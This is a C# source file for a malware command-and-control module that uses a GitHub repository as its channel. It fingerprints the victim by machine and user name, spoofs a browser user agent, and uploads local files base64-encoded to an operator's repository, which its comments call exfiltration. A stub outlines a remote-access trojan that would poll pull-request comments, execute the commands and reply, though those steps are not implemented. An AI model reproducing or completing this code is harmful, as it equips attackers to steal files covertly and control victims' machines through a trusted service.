using System;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Collections.Generic;

namespace Intelix.Targets.C2
{
    public static class GitHubC2
    {
        private static string _token;
        private static string _repoOwner;
        private static string _repoName;
        private static string _agentId;

        private static readonly HttpClient _client = new HttpClient();

        public static void Initialize(string token, string repo)
        {
            _token = token;
            // repo format: "owner/repo"
            var parts = repo.Split('/');
            if (parts.Length == 2)
            {
                _repoOwner = parts[0];
                _repoName = parts[1];
            }
            _agentId = Environment.MachineName + "_" + Environment.UserName;

            // Setup headers
            _client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
            _client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Token", _token);
            _client.DefaultRequestHeaders.Accept.ParseAdd("application/vnd.github.v3+json");
        }

        public static async Task<bool> UploadFile(string filePath, string type, byte[] content = null)
        {
            try
            {
                if (string.IsNullOrEmpty(_token)) return false;

                string fileName = Path.GetFileName(filePath);
                string fileContentBase64 = content != null ? Convert.ToBase64String(content) : 
                                           Convert.ToBase64String(File.ReadAllBytes(filePath));

                // Dystopia Path Pattern: type-DD-MM-YYYY-HH:MM:SS.ext
                string remoteFileName = $"{type}-{DateTime.Now:dd-MM-yyyy-HH-mm-ss}{Path.GetExtension(fileName)}";
                
                // Construct JSON payload manually to avoid deps
                string jsonBody = $"{{\"message\": \"Upload {type} from {_agentId}\", \"content\": \"{fileContentBase64}\"}}";

                // API: PUT /repos/{owner}/{repo}/contents/{path}
                string url = $"https://api.github.com/repos/{_repoOwner}/{_repoName}/contents/{remoteFileName}";

                var httpContent = new StringContent(jsonBody, Encoding.UTF8, "application/json");
                var response = await _client.PutAsync(url, httpContent);

                return response.IsSuccessStatusCode;
            }
            catch
            {
                return false;
            }
        }

        // RAT Logic Stub - Mimics Dystopia's PR creation
        // Note: Full RAT implementation would require parsing JSON responses which is verbose without libraries.
        // For this version, we focus on Exfiltration (UploadFile) as requested for "compatibility".
        public static async Task StartRAT()
        {
            try
            {
                 // To be implemented: 
                 // 1. Create Branch
                 // 2. Create PR "Agent#{ID}"
                 // 3. Loop: Get Comments -> Execute -> Reply
            }
            catch {}
        }
    }
}
